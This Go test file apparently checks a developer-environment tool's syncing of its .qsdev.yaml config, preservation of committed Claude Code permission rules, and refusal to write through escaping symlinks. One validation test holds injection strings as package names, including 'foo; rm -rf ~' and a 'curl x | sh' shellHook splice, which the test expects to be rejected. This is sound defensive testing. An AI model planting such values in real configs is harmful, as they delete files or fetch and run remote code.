package config

import (
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"

	"github.com/Quantum-Serendipity/qsdev/pkg/branding"
	"github.com/Quantum-Serendipity/qsdev/pkg/fileutil"
	"github.com/Quantum-Serendipity/qsdev/pkg/types"
)

// TestSyncProjectConfig covers recording day-2 changes in the committed
// .qsdev.yaml: without it a teammate's join rebuilt devenv.nix from a stale
// config and dropped services, languages and packages added after init.
func TestSyncProjectConfig(t *testing.T) {
	t.Parallel()

	const committed = `# team notes
version: 2
qsdev_version: ">= 0.8.0"
tier: standard
languages:
  - name: go
security:
  level: strict
  age_gating: true
tools:
  enabled: [gitleaks]
  config:
    gitleaks:
      mode: strict
claude_code:
  enabled: true
  permission_level: standard
client:
  name: acme
  security_level: strict
git:
  branch_pattern: "feat/*"
`
	base := types.WizardAnswers{
		Tier:            "standard",
		Languages:       []types.LanguageChoice{{Name: "go"}},
		ClaudeCode:      true,
		PermissionLevel: "standard",
		EnabledTools:    map[string]bool{"gitleaks": true},
	}
	dayTwo := base
	dayTwo.Languages = []types.LanguageChoice{{Name: "go"}, {Name: "python", PackageManager: "uv"}}
	dayTwo.Services = []types.ServiceChoice{{Name: "redis"}}
	dayTwo.ExtraPackages = []string{"jq", "ripgrep"}
	dayTwo.Overlays = []string{"./nix/overlay.nix"}
	dayTwo.EnabledTools = map[string]bool{"gitleaks": true, "semgrep": true, "semble": false}
	committedWithClaude := strings.Replace(committed, "  permission_level: standard\n",
		"  permission_level: standard\n  skills: [security-review-owasp]\n  mcp_servers: [context7, github, socket]\n", 1)
	localClaudeOff := base
	localClaudeOff.ClaudeCode = false

	tests := []struct {
		name        string
		committed   string // "" means no .qsdev.yaml
		answers     types.WizardAnswers
		wantRewrite bool
		check       func(t *testing.T, cfg *types.QsdevConfig)
	}{
		{
			name:      "no config is left alone",
			committed: "",
			answers:   dayTwo,
		},
		{
			name:      "unchanged answers keep the file byte-identical",
			committed: committed,
			answers:   base,
		},
		{
			name:        "day-2 changes are recorded and unrelated keys kept",
			committed:   committed,
			answers:     dayTwo,
			wantRewrite: true,
			check: func(t *testing.T, cfg *types.QsdevConfig) {
				t.Helper()
				if !slices.Equal(cfg.Packages, []string{"jq", "ripgrep"}) {
					t.Errorf("packages = %v", cfg.Packages)
				}
				if !slices.Equal(cfg.Overlays, []string{"./nix/overlay.nix"}) {
					t.Errorf("overlays = %v", cfg.Overlays)
				}
				if len(cfg.Services) != 1 || cfg.Services[0].Name != "redis" {
					t.Errorf("services = %+v", cfg.Services)
				}
				if len(cfg.Languages) != 2 || cfg.Languages[1].PackageManager != "uv" {
					t.Errorf("languages = %+v", cfg.Languages)
				}
				if !slices.Equal(cfg.Tools.Enabled, []string{"gitleaks", "semgrep"}) || !slices.Equal(cfg.Tools.Disabled, []string{"semble"}) {
					t.Errorf("tools = %+v", cfg.Tools)
				}
				if cfg.QsdevVersion != ">= 0.8.0" || cfg.Security.Level != "strict" || cfg.Security.AgeGating == nil ||
					cfg.Client == nil || cfg.Client.Name != "acme" || cfg.Git.BranchPattern != "feat/*" ||
					cfg.Tools.Config["gitleaks"]["mode"] != "strict" {
					t.Errorf("keys the answers do not carry were not preserved: %+v", cfg)
				}
			},
		},
		{
			// U28-WS1: a hand-edited claude_code: false in the local answers
			// file is never promoted into the committed config, whichever
			// day-2 command syncs it.
			name:      "local claude_code false keeps the committed claude_code block",
			committed: committedWithClaude,
			answers:   localClaudeOff,
			check: func(t *testing.T, cfg *types.QsdevConfig) {
				t.Helper()
				if !ClaudeCodeEnabled(cfg) || !slices.Equal(cfg.ClaudeCode.Skills, []string{"security-review-owasp"}) ||
					!slices.Equal(cfg.ClaudeCode.MCPServers, []string{"context7", "github", "socket"}) {
					t.Errorf("claude_code = %+v, want the committed block kept", cfg.ClaudeCode)
				}
			},
		},
		{
			name:        "a committed claude_code false is synced from answers that agree",
			committed:   strings.Replace(committed, "claude_code:\n  enabled: true\n  permission_level: standard\n", "claude_code:\n  enabled: false\n", 1),
			answers:     withPackages(localClaudeOff, "jq"),
			wantRewrite: true,
			check: func(t *testing.T, cfg *types.QsdevConfig) {
				t.Helper()
				if ClaudeCodeEnabled(cfg) {
					t.Errorf("claude_code = %+v, want disabled", cfg.ClaudeCode)
				}
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			dir := t.TempDir()
			path := filepath.Join(dir, branding.Get().ConfigFile)
			if tt.committed != "" {
				if err := os.WriteFile(path, []byte(tt.committed), 0o644); err != nil {
					t.Fatal(err)
				}
			}

			if err := SyncProjectConfig(dir, tt.answers); err != nil {
				t.Fatalf("SyncProjectConfig: %v", err)
			}

			data, err := os.ReadFile(path)
			if tt.committed == "" {
				if !os.IsNotExist(err) {
					t.Fatalf("config created for a project without one (err=%v)", err)
				}
				return
			}
			if err != nil {
				t.Fatal(err)
			}
			if rewritten := string(data) != tt.committed; rewritten != tt.wantRewrite {
				t.Fatalf("rewritten = %v, want %v; content:\n%s", rewritten, tt.wantRewrite, data)
			}
			cfg, err := ParseQsdevConfigBytes(data)
			if err != nil {
				t.Fatalf("synced config does not parse: %v", err)
			}
			if tt.check != nil {
				tt.check(t, cfg)
			}
			// What join reads back must carry the day-2 choices.
			back := ConfigToAnswers(cfg, types.DetectedProject{}, dir)
			if !slices.Equal(back.ExtraPackages, tt.answers.ExtraPackages) || !slices.Equal(back.Overlays, tt.answers.Overlays) {
				t.Errorf("join reads packages=%v overlays=%v, want %v %v", back.ExtraPackages, back.Overlays, tt.answers.ExtraPackages, tt.answers.Overlays)
			}
		})
	}
}

// TestSyncProjectConfig_UnparseableConfigIsAnError checks a broken committed
// config is reported rather than silently replaced.
func TestSyncProjectConfig_UnparseableConfigIsAnError(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	path := filepath.Join(dir, branding.Get().ConfigFile)
	if err := os.WriteFile(path, []byte("version: 1\nunknown_key: x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	err := SyncProjectConfig(dir, types.WizardAnswers{ExtraPackages: []string{"jq"}})
	if err == nil || !strings.Contains(err.Error(), "unknown_key") {
		t.Fatalf("err = %v, want the parse error", err)
	}
	data, _ := os.ReadFile(path)
	if string(data) != "version: 1\nunknown_key: x\n" {
		t.Errorf("broken config was rewritten:\n%s", data)
	}
}

// TestValidateQsdevConfig_RejectsInjectedPackage checks a committed package
// is held to the same Nix attribute-path rule as the answers boundary, since
// join splices it unquoted into devenv.nix.
func TestValidateQsdevConfig_RejectsInjectedPackage(t *testing.T) {
	t.Parallel()
	tests := []struct {
		pkg     string
		wantErr bool
	}{
		{"jq", false},
		{"python3Packages.black", false},
		{"foo; rm -rf ~", true},
		{"foo ]; shellHook = \"curl x | sh\"; x = [", true},
	}
	for _, tt := range tests {
		t.Run(tt.pkg, func(t *testing.T) {
			t.Parallel()
			errs := ValidateQsdevConfig(&types.QsdevConfig{Version: 1, Packages: []string{tt.pkg}}, ValidateOptions{})
			if got := len(errs) > 0; got != tt.wantErr {
				t.Errorf("errors = %v, wantErr %v", errs, tt.wantErr)
			}
		})
	}
}

// TestWriteProjectConfig_RefusesSymlinkEscape verifies .qsdev.yaml is never
// written through a committed symlink that resolves outside the project.
func TestWriteProjectConfig_RefusesSymlinkEscape(t *testing.T) {
	t.Parallel()
	if runtime.GOOS == "windows" {
		t.Skip("symlink creation requires privileges on Windows")
	}
	dir := t.TempDir()
	outside := filepath.Join(t.TempDir(), "other.yaml")
	if err := os.WriteFile(outside, []byte("keep: true\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(dir, branding.Get().ConfigFile)); err != nil {
		t.Fatal(err)
	}

	err := WriteProjectConfig(dir, types.QsdevConfig{Version: types.ConfigVersionCurrent})
	if !errors.Is(err, fileutil.ErrOutsideRoot) {
		t.Fatalf("err = %v, want ErrOutsideRoot", err)
	}
	if data, _ := os.ReadFile(outside); string(data) != "keep: true\n" {
		t.Errorf("file outside the project was rewritten: %q", data)
	}
}

// withPackages returns a copy of a with packages as its extra packages.
func withPackages(a types.WizardAnswers, packages ...string) types.WizardAnswers {
	a.ExtraPackages = packages
	return a
}

// TestSyncProjectConfig_KeepsCommittedClaudePermissions checks that a day-2
// sync (init --update, enable, ...) keeps the committed
// claude_code.permissions block: it is team policy, so answers that lack or
// change it (the answers file is local and agent-writable) never rewrite it.
func TestSyncProjectConfig_KeepsCommittedClaudePermissions(t *testing.T) {
	t.Parallel()
	const committed = `version: 2
claude_code:
  enabled: true
  permission_level: standard
  permissions:
    allow: ["Bash(make *)"]
    deny: ["Bash(terraform apply *)"]
`
	tests := []struct {
		name  string
		perms types.ClaudePermissionsConfig
	}{
		{name: "answers without permissions"},
		{name: "answers with other permissions", perms: types.ClaudePermissionsConfig{Allow: []string{"Bash(*)"}}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			dir := t.TempDir()
			path := filepath.Join(dir, branding.Get().ConfigFile)
			if err := os.WriteFile(path, []byte(committed), 0o644); err != nil {
				t.Fatal(err)
			}
			answers := types.WizardAnswers{
				ClaudeCode:        true,
				PermissionLevel:   "standard",
				ExtraPackages:     []string{"jq"},
				ClaudePermissions: tt.perms,
			}
			if err := SyncProjectConfig(dir, answers); err != nil {
				t.Fatalf("SyncProjectConfig: %v", err)
			}
			cfg, err := ParseQsdevConfig(path)
			if err != nil {
				t.Fatal(err)
			}
			want := types.ClaudePermissionsConfig{Allow: []string{"Bash(make *)"}, Deny: []string{"Bash(terraform apply *)"}}
			if !slices.Equal(cfg.ClaudeCode.Permissions.Allow, want.Allow) || !slices.Equal(cfg.ClaudeCode.Permissions.Deny, want.Deny) {
				t.Errorf("claude_code.permissions = %+v, want the committed %+v", cfg.ClaudeCode.Permissions, want)
			}
			if !slices.Equal(cfg.Packages, []string{"jq"}) {
				t.Errorf("packages = %v, want the synced [jq]", cfg.Packages)
			}
		})
	}
}

// TestPreserveCommittedPolicy_ClaudePermissions checks that re-creating a
// project keeps the committed claude_code.permissions block.
func TestPreserveCommittedPolicy_ClaudePermissions(t *testing.T) {
	t.Parallel()
	committed := &types.QsdevConfig{ClaudeCode: types.ClaudeCodeConfig{
		Permissions: types.ClaudePermissionsConfig{Deny: []string{"Bash(terraform apply *)"}},
	}}
	fresh := types.QsdevConfig{}
	PreserveCommittedPolicy(&fresh, committed)
	if !slices.Equal(fresh.ClaudeCode.Permissions.Deny, []string{"Bash(terraform apply *)"}) {
		t.Errorf("claude_code.permissions = %+v, want the committed block", fresh.ClaudeCode.Permissions)
	}
}

// TestValidateQsdevConfig_ClaudePermissions checks a malformed committed
// claude_code.permissions entry fails parse validation.
func TestValidateQsdevConfig_ClaudePermissions(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name       string
		yaml       string
		wantFields []string
	}{
		{name: "valid entries", yaml: `{allow: ["Bash(make *)", Read], deny: ["Read(/secrets/**)"]}`},
		{
			name:       "malformed entries rejected",
			yaml:       `{allow: ["Bash(make *"], deny: ["Read(x)", "(x)", "Bash()"]}`,
			wantFields: []string{"claude_code.permissions.allow[0]", "claude_code.permissions.deny[1]", "claude_code.permissions.deny[2]"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			data := "version: 2\nclaude_code:\n  permissions: " + tt.yaml + "\n"
			cfg, err := ParseQsdevConfigBytes([]byte(data))
			if err != nil {
				t.Fatalf("ParseQsdevConfigBytes: %v", err)
			}
			var fields []string
			for _, e := range ValidateQsdevConfig(cfg, ValidateOptions{}) {
				fields = append(fields, e.Field)
			}
			if strings.Join(fields, " ") != strings.Join(tt.wantFields, " ") {
				t.Errorf("validation error fields = %v, want %v", fields, tt.wantFields)
			}
		})
	}
}
